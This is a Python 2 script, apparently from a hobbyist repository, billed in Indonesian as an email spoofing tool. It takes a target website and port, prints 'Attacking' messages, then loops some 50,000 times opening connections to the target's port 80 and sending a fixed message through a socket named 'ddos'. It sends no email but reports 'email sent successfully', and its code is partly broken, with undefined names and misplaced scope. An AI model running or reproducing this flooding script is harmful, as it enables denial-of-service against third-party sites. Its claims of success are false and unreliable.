#!/usr/bin/python
# -*- coding: utf-8 -*-
# Spoofing
# Coded by Nedi Senja
# Github: https://github.com/stepbystepexe/Spoofing

from __opt__ import *
import os, sys, time, string, socket, marshal

info = """
Nama        : Spoofing
Versi       : 2.5 (Update: 13 Oktober 2020, 5:30 AM)
Tanggal     : 02 April 2019
Author      : Nedi Senja
Tujuan      : Mengirim email Spoof
              pada website secara target
Terimakasih : Allah SWT.
              FR13NDS, & seluruh
              manusia seplanet bumi
NB          : Manusia gax ada yang sempurna
              sama kaya tool ini.
              Silahkan laporkan kritik atau saran
              Ke - Email: d_q16x@outlook.co.id
                 - WhatsApp: +62 8577-5433-901

[ \033[4mGunakan tool ini dengan bijak \033[0m]\n """

example = """\033[0;102;90;1m[        e-Mail Spoof, My Github: @stepbystepexe        ]\033[0m"""

def restart():
    python = sys.executable
    os.execl(python, python, * sys.argv)
    curdir = os.getcwd()

def loads():
    x = [
     '.   ', '..  ', '... ']
    for o in x:
        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mMemulai ' + o,
        sys.stdout.flush()
        time.sleep(1)

def write(o):
    for i in o + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.03)

os.system('clear')
os.system('reset')
time.sleep(1)
print
print(logo)
print(example)
print
print("\033[0m[\033[1;96mあ\033[0m] \033[1;77mMulai Menggunakan Spoofing")
print
print("\033[0m[\033[93;1m&\033[0m] LISENSI")
print("\033[0m[\033[94;1m#\033[0m] Informasi")
print("\033[0m[\033[92;1m*\033[0m] Perbarui")
print("\033[0m[\033[91;1m-\033[0m] Keluar")
print
option = raw_input("\033[0m[\033[1;95m/\033[0m] \033[1;77mMasukan opsi: \033[0m")
if option.strip() in 'あ 1 gunakan'.split():
    print
    host = raw_input("\033[0m[\033[95;1m+\033[0m] \033[77;1mMasukan Web Target: \033[0m")
    port = input("\033[0m[\033[92;1m+\033[0m] \033[77;1mMasukan Port: \033[0m")
    connect=50000
    ip = socket.gethostbyname( host )
    write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
    print
    print ("\033[0m[\033[96;1m*\033[0m] Attacking \033[1;77m[" + host + "]")
    time.sleep(3)
    print ("\033[0m[\033[93;1m*\033[0m] Attack ke IP \033[1;77m["+ ip + "]")
    time.sleep(3)
    message=("NO SYSTEM IS SAFE")
    print
    loads()
    print
    print
    time.sleep(3)
elif option.strip() in '& 2 lisensi'.split():
    print
    os.system('nano LICENSE')
    print
    restart()
elif option.strip() in '# 3 info'.split():
    os.system('clear')
    print(example)
    os.system('toilet -f smslant Spoof')
    print(info)
    time.sleep(1)
    print
    raw_input('[ Tekan Enter ]')
    restart()
elif option.strip() in '* 4 perbarui'.split():
    print
    os.system('git pull origin master')
    print
    raw_input('\033[0m[ \033[92mTekan Enter \033[0m]')
    restart()
elif option.strip() in '- keluar 0'.split():
    print("\n\033[0m[\033[1;91m!\033[0m] \033[1;77mKeluar dari program!")
    print
    sys.exit(1)
else:
    print("\n\033[0m[=\033[1;41;77m Pilihan Salah \033[0m=]")
    print
    time.sleep(1)
    restart()

def spoof():
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("\033[0m[\033[91;1m!\033[0m] \033[77;1mTidak ada koneksi \033[0m [" + ip + "]")
    write ( "\033[0mMengirim [ \033[0;1;91mEMAIL\033[0m ] berhasil ke [ \033[0;1;2;96m" + ip + "\033[0m ]")
    ddos.close()
for i in range(1, connect):
    spoof()
print("\033[0m[\033[91;1m!\033[0m] \033[77;1mSpoofing gagal ...")

if __name__ == "__main__":
    answer = raw_input(" \033[0m[\033[96;1m?\033[0m] \033[1;77mLanjut menggunakan Spoofing: ")
    if answer.strip() in "Lanjut lanjut Y y".split():
        restart()
    else:
        os.system(curdir+"deqmain.py")
